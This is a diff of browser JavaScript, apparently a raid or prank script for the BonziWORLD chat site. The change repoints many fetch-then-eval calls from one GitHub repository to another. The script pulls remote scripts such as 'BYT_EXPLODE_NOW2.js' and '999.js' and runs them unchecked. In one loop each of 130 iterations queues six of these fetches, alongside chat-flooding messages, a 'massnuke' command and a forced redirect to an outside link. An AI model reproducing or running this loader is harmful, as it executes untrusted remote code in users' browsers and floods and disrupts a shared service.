@@ -29,27 +29,27 @@ setTimeout(()=>{
         setTimeout(Mess, 10 * i);
     }
 setTimeout(()=>{
-    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/BYT_EXPLODE_NOW2.js').then(r=>r.text()).then(eval);
+    fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/BYT_EXPLODE_NOW2.js').then(r=>r.text()).then(eval);
 setTimeout(()=>{
-    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/BYT_EXPLODE_NOW2.js').then(r=>r.text()).then(eval);
+    fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/BYT_EXPLODE_NOW2.js').then(r=>r.text()).then(eval);
 setTimeout(()=>{
-    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/BYT_REMOVER_FOREVER.js').then(r=>r.text()).then(eval);
-    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/UB.js').then(r=>r.text()).then(eval);
+    fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/BYT_REMOVER_FOREVER.js').then(r=>r.text()).then(eval);
+    fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/UB.js').then(r=>r.text()).then(eval);
     for (let i = 0; i < 130; i++) {
         setTimeout(()=>{sayAsUbAnomaly("YOU CANNOT BE DOING THIS IN UB VALLEY.")}, 40 * i);
     }
 setTimeout(()=>{
-    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/UBICE.js').then(r=>r.text()).then(eval);
-    fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/999.js').then(r=>r.text()).then(eval);
+    fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/UBICE.js').then(r=>r.text()).then(eval);
+    fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/999.js').then(r=>r.text()).then(eval);
     cmd("byoutube us07_zCCZt8");
     alert("YOU KNOW WHAT YOU HAVE DONE IS VERY REGRETFUL, YOU MADE EVERYBODY IN UB VALLEY ATTACK YOU");
     for (let i = 0; i < 130; i++) {
-        setTimeout(()=>{fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/BYT_EXPLODE_NOW2.js').then(r=>r.text()).then(eval)}, 100 * i);
-        setTimeout(()=>{fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/🗫.js').then(r=>r.text()).then(eval)}, 100 * i);
-        setTimeout(()=>{fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/OUTSIDEOFVID.js').then(r=>r.text()).then(eval)}, 100 * i);
-        setTimeout(()=>{fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/OHGODWHYME.js').then(r=>r.text()).then(eval)}, 100 * i);
-        setTimeout(()=>{fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/OUTRO.js').then(r=>r.text()).then(eval)}, 100 * i);
-        setTimeout(()=>{fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRULTRAJAVASCRIPTLIST/refs/heads/main/FLOWERS.js').then(r=>r.text()).then(eval)}, 100 * i);
+        setTimeout(()=>{fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/BYT_EXPLODE_NOW2.js').then(r=>r.text()).then(eval)}, 100 * i);
+        setTimeout(()=>{fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/🗫.js').then(r=>r.text()).then(eval)}, 100 * i);
+        setTimeout(()=>{fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/OUTSIDEOFVID.js').then(r=>r.text()).then(eval)}, 100 * i);
+        setTimeout(()=>{fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/OHGODWHYME.js').then(r=>r.text()).then(eval)}, 100 * i);
+        setTimeout(()=>{fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/OUTRO.js').then(r=>r.text()).then(eval)}, 100 * i);
+        setTimeout(()=>{fetch('https://raw.githubusercontent.com/27105/The-Entire-BonziWORLD-JavaScript-Pack/refs/heads/main/FLOWERS.js').then(r=>r.text()).then(eval)}, 100 * i);
         cmd("massnuke ")
         setTimeout(()=>{window.location.replace("https://stt.gg/R92Pqkhj");},7000)
     }
